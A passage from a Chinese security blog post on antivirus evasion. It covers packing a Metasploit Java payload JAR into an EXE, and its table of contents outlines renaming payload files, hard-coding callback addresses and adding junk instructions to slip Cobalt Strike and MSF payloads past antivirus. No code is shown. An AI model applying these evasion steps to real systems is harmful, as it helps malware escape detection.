+<p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104200072.png" alt="image-20230504104200072"></p>
+<h6 id="打包成jar文件（实现了通杀）"><a href="#打包成jar文件（实现了通杀）" class="headerlink" title="打包成jar文件（实现了通杀）"></a>打包成jar文件（实现了通杀）</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104304582.png" alt="image-20230504104304582"></p>
+<p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104327570.png" alt="image-20230504104327570"></p>
+<h5 id="2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）"><a href="#2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）" class="headerlink" title="2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）"></a>2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）</h5><p>安装：exe4j Inno进行打包</p>
+<p>exe4j-下载链接：<a target="_blank" rel="noopener" href="https://exe4j.apponic.com/">https://exe4j.apponic.com/</a></p>
+<p>inno-下载链接：<a target="_blank" rel="noopener" href="https://jrsoftware.org/isdl.php">https://jrsoftware.org/isdl.php</a></p>
+<p>操作说明：<a target="_blank" rel="noopener" href="https://www.jb51.net/article/236000.htm">Java jar打包成exe应用程序的详细步骤_java_脚本之家 (jb51.net)</a></p>
+<h6 id="生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了"><a href="#生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了" class="headerlink" title="生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了"></a>生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504112239696.png" alt="image-20230504112239696"></p>
+<h6 id="照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）"><a href="#照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）" class="headerlink" title="照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）"></a>照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）</h6></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pwy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/">http://example.com/2023/04/27/Day111-免杀对抗-Java-ASM-汇编CS调用-内联C-MSF源码特征修改-Jar打包/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">ai潼</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/tt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/" title="Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/" title="Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tt.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pwy</div><div class="author-info__description">自律&上进</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">#知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">#章节点：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97%E7%9B%AE%E6%A0%87%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">对抗目标：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">编程语言：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E6%8A%80%E6%9C%AF%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">涉及技术：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">演示案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9E%A2-ASM-ShellCode-%E7%BA%AF%E6%B1%87%E7%BC%96-amp-%E5%86%85%E8%81%94C%E6%B7%B7%E7%BC%96-CS"><span class="toc-number">3.1.</span> <span class="toc-text">➢ ASM-ShellCode-纯汇编&amp;内联C混编-CS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9E%A2-JAVA-ShellCode-%E6%BA%90%E7%A0%81%E4%BF%AE%E6%94%B9-amp-%E6%89%93%E5%8C%85EXE-MSF"><span class="toc-number">3.2.</span> <span class="toc-text">➢ JAVA-ShellCode-源码修改&amp;打包EXE-MSF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASM-ShellCode-%E7%BA%AF%E6%B1%87%E7%BC%96-amp-%E5%86%85%E8%81%94C%E6%B7%B7%E7%BC%96-CS"><span class="toc-number">4.</span> <span class="toc-text">#ASM-ShellCode-纯汇编&amp;内联C混编-CS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E7%BC%96%E8%AF%91%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0CS%E5%85%8D%E6%9D%80"><span class="toc-number">4.0.1.</span> <span class="toc-text">1、编译汇编代码实现CS免杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%86%85%E8%81%94C%E6%B7%B7%E7%BC%96%EF%BC%8C%E8%8A%B1%E6%8C%87%E4%BB%A4-%E7%94%9F%E6%88%90%E5%AF%BC%E5%85%A5%EF%BC%88%E7%9B%B8%E5%BD%93%E4%BA%8E%E7%94%9F%E6%88%90%E4%B8%80%E4%BA%9B%E6%B2%A1%E6%9C%89%E7%9A%84%E4%B8%9C%E8%A5%BF%E7%94%A8%E6%9D%A5%E5%B9%B2%E6%89%B0%EF%BC%89"><span class="toc-number">4.0.2.</span> <span class="toc-text">2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8A%B1%E6%8C%87%E4%BB%A4"><span class="toc-number">4.0.3.</span> <span class="toc-text">花指令</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8A%8A%E8%BD%AF%E4%BB%B6%E6%8B%96%E8%BF%9B%E5%8E%BB%E6%9F%A5%E7%9C%8B%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">4.0.3.1.</span> <span class="toc-text">把软件拖进去查看入口点</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%86%E4%B8%8A%E9%9D%A2%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E5%8F%A3%E7%82%B9%E6%95%B0%E6%8D%AE%E6%9B%BF%E6%8D%A2%E5%88%B0%E6%AD%A4%E5%A4%84"><span class="toc-number">4.0.3.2.</span> <span class="toc-text">将上面的二进制入口点数据替换到此处</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2%E5%90%8E%EF%BC%8C%E6%89%93%E5%BC%80Ollydbg%EF%BC%8C%E5%B0%86exe%E6%96%87%E4%BB%B6%E6%8B%96%E6%8B%BD%E8%BF%9B%E5%8E%BB%E5%8F%8D%E7%BC%96%E8%AF%91%EF%BC%8C%E6%89%BE%E5%88%B0%E7%A9%BA%E7%99%BD%E5%A4%84%EF%BC%8C%E5%B0%86%E4%B8%8A%E9%9D%A2%E7%9A%84%E8%8A%B1%E6%8C%87%E4%BB%A4%E7%B2%98%E8%B4%B4%E5%88%B0%E6%AD%A4%E5%A4%84"><span class="toc-number">4.0.3.3.</span> <span class="toc-text">替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%90%8E%E5%85%A8%E9%80%89%E5%86%85%E5%AE%B9%E5%8F%B3%E9%94%AE"><span class="toc-number">4.0.3.4.</span> <span class="toc-text">修改后全选内容右键</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%85%A8%E9%83%A8%E5%A4%8D%E5%88%B6"><span class="toc-number">4.0.3.5.</span> <span class="toc-text">选择全部复制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98%E4%B8%BA%E6%96%B0%E6%96%87%E4%BB%B6"><span class="toc-number">4.0.3.6.</span> <span class="toc-text">保存为新文件</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E8%81%94C%E6%B7%B7%E7%BC%96"><span class="toc-number">4.0.4.</span> <span class="toc-text">内联C混编</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA-ShellCode-%E6%BA%90%E7%A0%81%E4%BF%AE%E6%94%B9-amp-%E6%89%93%E5%8C%85EXE-MSF%EF%BC%88%E4%B8%8D%E6%98%AF%E5%BE%88%E5%AE%9E%E7%94%A8%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">#JAVA-ShellCode-源码修改&amp;打包EXE-MSF（不是很实用）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81JAR%E5%8C%85%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9%E5%85%8D%E6%9D%80%EF%BC%88%E5%AF%B9%E6%96%B9%E6%9C%89java%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-number">5.0.1.</span> <span class="toc-text">1、JAR包源码特征修改免杀（对方有java环境）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E5%90%8E%E5%AF%BC%E5%87%BA"><span class="toc-number">5.0.1.1.</span> <span class="toc-text">反编译后导出</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8A%8A%E8%BF%99%E4%BA%9B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E5%90%8D%E4%BF%AE%E6%94%B9%EF%BC%8C%E5%B0%86metasploit-dat%E6%94%B9%E4%B8%BAconfig%EF%BC%8C%E5%B0%86metasploit%E9%87%8C%E9%9D%A2%E7%9A%84payload-java%E5%89%AA%E5%88%87%E5%88%B0%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%94%B9%E5%90%8D%E4%B8%BAMain-java%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4metasploit%E7%9B%AE%E5%BD%95"><span class="toc-number">5.0.1.2.</span> <span class="toc-text">把这些敏感文件名修改，将metasploit.dat改为config，将metasploit里面的payload.java剪切到根目录，改名为Main.java，并删除metasploit目录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%86%E5%8E%9F%E6%9D%A5%E7%9A%84MANTFEST-MF%E7%9A%84%E5%86%85%E5%AE%B9%E6%96%87%E4%BB%B6%E5%90%8D%E5%AF%B9%E5%BA%94%E4%B9%9F%E8%A6%81%E4%BF%AE%E6%94%B9"><span class="toc-number">5.0.1.3.</span> <span class="toc-text">将原来的MANTFEST.MF的内容文件名对应也要修改</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%88%90"><span class="toc-number">5.0.1.4.</span> <span class="toc-text">修改成</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E6%88%90"><span class="toc-number">5.0.1.5.</span> <span class="toc-text">也可以修改成</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E6%9D%A5%E4%BB%A3%E7%A0%81%E9%87%8C%E9%9D%A2%EF%BC%8Cstr4%E6%98%AF%E4%BB%8Emetasploit-dat%E9%87%8C%E9%9D%A2%E8%8E%B7%E5%8F%96%E7%9A%84ip%E5%9C%B0%E5%9D%80%EF%BC%8Cj%E6%98%AF%E4%BB%8Emetasploit-dat%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%B0%86%E4%BB%8Emetasploit-dat%E5%88%A0%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%9C%A8%E4%BB%A3%E7%A0%81%E9%87%8C%E9%9D%A2%E5%AE%9A%E4%B9%89"><span class="toc-number">5.0.1.6.</span> <span class="toc-text">原来代码里面，str4是从metasploit.dat里面获取的ip地址，j是从metasploit.dat获取端口，由于将从metasploit.dat删了，所以在代码里面定义</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9%E5%90%8E"><span class="toc-number">5.0.1.7.</span> <span class="toc-text">进行修改后</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E4%B8%80%E5%85%B1%E6%9C%89%E5%A6%82%E4%B8%8B%E6%96%87%E4%BB%B6"><span class="toc-number">5.0.1.8.</span> <span class="toc-text">最后一共有如下文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%8C%85%E6%88%90class"><span class="toc-number">5.0.1.9.</span> <span class="toc-text">打包成class</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%93%E5%8C%85%E6%88%90jar%E6%96%87%E4%BB%B6%EF%BC%88%E5%AE%9E%E7%8E%B0%E4%BA%86%E9%80%9A%E6%9D%80%EF%BC%89"><span class="toc-number">5.0.1.10.</span> <span class="toc-text">打包成jar文件（实现了通杀）</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81JAR%E5%8C%85%E6%89%93%E5%8C%85EXE%E6%89%A7%E8%A1%8C%E5%85%8D%E6%9D%80%EF%BC%88%E5%AF%B9%E6%96%B9%E6%97%A0java%E7%8E%AF%E5%A2%83%EF%BC%8C%E4%B8%8D%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="toc-number">5.0.2.</span> <span class="toc-text">2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%9F%E6%88%90exe%E6%96%87%E4%BB%B6%E5%90%8E%E4%B8%8D%E7%94%A8%E9%A9%AC%E4%B8%8A%E6%89%93%E5%BC%80%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%9C%A8%E6%B2%A1%E6%9C%89java%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BB%8D%E7%84%B6%E8%BF%90%E8%A1%8C%E4%B8%8D%E4%BA%86"><span class="toc-number">5.0.2.1.</span> <span class="toc-text">生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%85%A7%E7%9D%80%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AF%B4%E6%98%8E%E4%B8%80%E6%AD%A5%E6%AD%A5%E5%AE%8C%E6%88%90%EF%BC%88%E5%A4%8D%E6%9D%82%EF%BC%8C%E5%A4%AA%E6%8B%89%E4%BA%86%EF%BC%8C%E7%94%9F%E6%88%90%E4%BA%86%E5%87%A0%E5%8D%81MB%E7%9A%84exe%E6%96%87%E4%BB%B6%EF%BC%8C%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C%E8%BF%98%E4%B8%8D%E5%A5%BD%EF%BC%89"><span class="toc-number">5.0.2.2.</span> <span class="toc-text">照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/12/hello-world/" title="Hello World">Hello World</a><time datetime="2023-05-12T15:24:14.066Z" title="发表于 2023-05-12 23:24:14">2023-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/" title="Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言">Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言</a><time datetime="2023-04-27T00:35:05.000Z" title="发表于 2023-04-27 08:35:05">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/" title="Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化">Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化</a><time datetime="2023-04-27T00:34:45.000Z" title="发表于 2023-04-27 08:34:45">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/" title="Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包">Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包</a><time datetime="2023-04-27T00:34:28.000Z" title="发表于 2023-04-27 08:34:28">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/" title="Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密">Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密</a><time datetime="2023-04-27T00:34:13.000Z" title="发表于 2023-04-27 08:34:13">2023-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By pwy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
